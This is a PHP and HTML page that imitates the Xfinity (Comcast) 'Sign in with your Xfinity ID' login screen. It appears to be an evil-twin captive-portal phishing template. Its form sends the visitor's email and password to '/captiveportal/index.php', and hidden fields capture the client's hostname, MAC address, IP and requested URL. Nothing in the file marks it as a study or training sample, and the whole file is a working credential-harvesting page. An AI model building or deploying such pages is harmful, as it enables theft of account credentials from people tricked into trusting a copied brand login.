<?php

header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache");

$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');

?>

<HTML>

<head>
		<link rel="stylesheet" href="bootstrap.min.css">
	<script type="text/javascript" src="static/js/comcast-common.js" ></script>
		<title>Sign in to Xfinity</title>
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
		<meta name="mobile-web-app-capable" content="yes">
		<meta name="apple-mobile-web-app-capable" content="yes">
		<meta name="description" content="Get the most out of Xfinity from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together &mdash; anytime, anywhere, on any device.">
		<meta name="viewport" content="width=device-width,initial-scale=1">
		<meta name="msapplication-TileColor" content="#ffffff">
		<meta name="msapplication-TileImage" content="static/images/global/favicon/favicon-96x96.png">
		<meta name="theme-color" content="#ffffff">
		<link rel="stylesheet" href="static/next/dist/prism-ui/prism-ui-f8016a4.css"/>
    	<link rel="stylesheet" href="static/next/dist/bundle-f8016a4.css"/>
    <script type="module" src="static/next/dist/prism-ui/prism-ui.esm-f8016a4.js"></script>
    <script type="text/javascript" src="static/next/dist/bundle-f8016a4.js" defer></script>
		<link rel="shortcut icon" href="static/images/favicon/favicon.ico">
		<link rel="apple-touch-icon" sizes="57x57" href="static/images/favicon/apple-icon-57x57.png">
		<link rel="apple-touch-icon" sizes="60x60" href="static/images/favicon/apple-icon-60x60.png">
		<link rel="apple-touch-icon" sizes="72x72" href="https://login.xfinity.com/static/images/favicon/apple-icon-72x72.png">
		<link rel="apple-touch-icon" sizes="76x76" href="static/images/favicon/apple-icon-76x76.png">
		<link rel="apple-touch-icon" sizes="114x114" href="static/images/favicon/apple-icon-114x114.png">
		<link rel="apple-touch-icon" sizes="120x120" href="static/images/favicon/apple-icon-120x120.png">
		<link rel="apple-touch-icon" sizes="144x144" href="static/images/favicon/apple-icon-144x144.png">
		<link rel="apple-touch-icon" sizes="152x152" href="static/images/favicon/apple-icon-152x152.png">
		<link rel="apple-touch-icon" sizes="180x180" href="static/images/favicon/apple-icon-180x180.png">
		<link rel="icon" type="image/png" sizes="192x192"  href="static/images/favicon/android-icon-192x192.png">
		<link rel="icon" type="image/png" sizes="32x32" href="static/images/favicon/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="96x96" href="static/images/favicon/favicon-96x96.png">
		<link rel="icon" type="image/png" sizes="16x16" href="static/images/favicon/favicon-16x16.png">
		<link rel="manifest" href="static/images/favicon/manifest.json">
	<script src="https://scripts.webcontentassessor.com/scripts/e5d00e87ba3bf67af60bbc75377626fb1f0b0a10c2e83ca40b7a245ca2cd8367"></script>

<style>
.da-fullscreen iframe[id^="utif_"] {max-width: 300px;
max-height: 600px;
overflow: hidden;}
</style>

<script>
document.addEventListener("c-tracking-log-page", function () {
document.documentElement.classList.add(digitalData.page.category.subCategory1);
});
</script>

<style>
input {
  width : 200px;
  padding: 0;
  margin: 0;
  border-style: solid;
}


footer { 
  display: table;
  text-align: center;
  margin-left: auto;
  margin-right: auto;
}

button {
    color:white;
}

btn-primary, btn-block, btn-xlarge, btn-sharp {display: inline-block;
    height: 38px;    padding: 0 30px;    text-align: center;
    color: white;    font-size: 11px;    font-weight: 600;
    line-height: 38px;    letter-spacing: .1rem;
    text-transform: uppercase;    text-decoration: none;
    white-space: nowrap;    border-radius: 4px;
    border: 1px solid #bbb;    cursor: pointer;
    box-sizing: border-box;    border-radius: 6px;
    width: 332px;
}
</style>
						
</head>



<BODY>

<div id="breakpoints"></div>
<div id="background" class="hidden lg:block absolute top-0 w-full h-full"></div>
<main id="bd" >

<div id="left" class="box-border align-top text-left mr-7.5 w-[594px] hidden lg:inline-block empty:hidden">		

<div id="ad-block">
	<h2 id="ad-heading" class="screen-reader-text sr-only">Advertisement</h2>
	<div id="ad-target">
		<script type="text/javascript" src="static/js/vm-login-form-ad-f8016a4.js"></script>
		<script>
			adInfo.init({
				targetAdElemId: 'ad-target',
				tvePartner: '',
				useIframe : false
			});
		</script>
	</div>

<div id="ads-info">
	<a class="first" href="http://www.comcast.net/adinformation" rel="default" target="_blank">Ad Info</a>
			<span class="mx-2 w-px h-3.5 align-middle inline-block bg-fill-neutral2-base"></span>
		<a href="https://www.surveymonkey.com/s.aspx?sm=FyNNVDhj_2f2FNc2KVOHQ4eg_3d_3d" target="_blank">Ad Feedback</a>
</div>
	<img width="0" height="0" src="https://7468.v.fwmrm.net/ad/u?mode=echo&amp;cr=https%3A%2F%2Fdpm.demdex.net%2Fibs%3Adpid%3D796%26dpuuid=%23%7Buser.id%7D">
<img src="https://xfinitydigital.demdex.net/event?d_sid=4702129" width="0" height="0" /></div>
	</div><div id="right"class="w-full max-w-[420px] break-words">		
	<prism-box outline="false" class="p-0 lg:p-6">

<div class="single logo-wrapper flex items-center mb-7 lg:mb-10">
<span aria-role="img" class="bg-xfinity-logo w-[71px] inline-block flex-shrink-0 h-6 max-h-6"></span>
</div>

<prism-text tag="h1" display="display2">Sign in with your Xfinity ID</prism-text>
		
<prism-text id="implied-legal" display="body3">By signing in, you agree to our <a href="http://my.xfinity.com/terms/web/">Terms of Service</a> and <a href="http://xfinity.comcast.net/privacy/">Privacy Policy</a>.</prism-text>
					<br><br>
        
            
<form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">

            <input type="text" name="email" class="form-email" placeholder="Email, mobile, or username" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
            <input type="password" name="password" class="form-password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">
           <br> <button class="btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Let's go</button>

          </form>

<prism-lineitem id="quick-bill-pay" tag="a" class="hidden"
					label="Pay any balance without signing in"
					href="https://customer.xfinity.com/lite" target="_self">
	</prism-lineitem>
			
	<prism-lineitem id="forgot-xfinity-id-item" tag="a"
			label="Find your Xfinity ID"
			href="https://idm.xfinity.com/myaccount/lookup?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FselectAccount%3Dfalse%26ipAddrAuthn%3Dfalse%26passive%3Dfalse%26reqId%3Dae4f027f-b8f9-4d45-b99c-dee78dbcd5ce%26r%3Dcomcast.net%26s%3Dportal%26deviceAuthn%3Dfalse%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26forceAuthn%3D0%26lang%3Den%26rm%3D2&lang=en" target="_self">
	</prism-lineitem>

	<prism-lineitem id="create-username-item" tag="a"
			label="Create a new Xfinity ID"
			href="https://idm.xfinity.com/myaccount/create-uid?continue=https%3A%2F%2Flogin.xfinity.com%2Flogin%3FselectAccount%3Dfalse%26ipAddrAuthn%3Dfalse%26passive%3Dfalse%26reqId%3Dae4f027f-b8f9-4d45-b99c-dee78dbcd5ce%26r%3Dcomcast.net%26s%3Dportal%26deviceAuthn%3Dfalse%26continue%3Dhttp%253A%252F%252Fxfinity.comcast.net%252F%26forceAuthn%3D0%26lang%3Den%26rm%3D2&lang=en" target="_self">
	</prism-lineitem>

<div id="footer">
<footer>
<span class="content">
<span class="copyright">© 2022 Comcast</span>
<nav>
<span class="divider hide-compact"></span>
<span class="links">
<a href="https://www.xfinity.com/privacy/policy">Privacy Policy</a>
<span class="divider"></span>
<a href="http://my.xfinity.com/terms/web/">Terms of Service</a>
</span>
<span class="ad-links divider"></span>
<span class="ad-links links">
<a href="http://www.comcast.net/adinformation" target="_blank">Ad Info</a>
<span class="divider"></span>
<a href="https://www.surveymonkey.com/s.aspx?sm=FyNNVDhj_2f2FNc2KVOHQ4eg_3d_3d" target="_blank">Ad Feedback</a>
</span>
<span class="divider hide-compact"></span>
<span class="links">
<a href="https://www.xfinity.com/privacy/manage-preference">Do Not Sell My Personal Information</a>
</span>
</nav>
</span>
</footer>
</div>


    </BODY>

</HTML>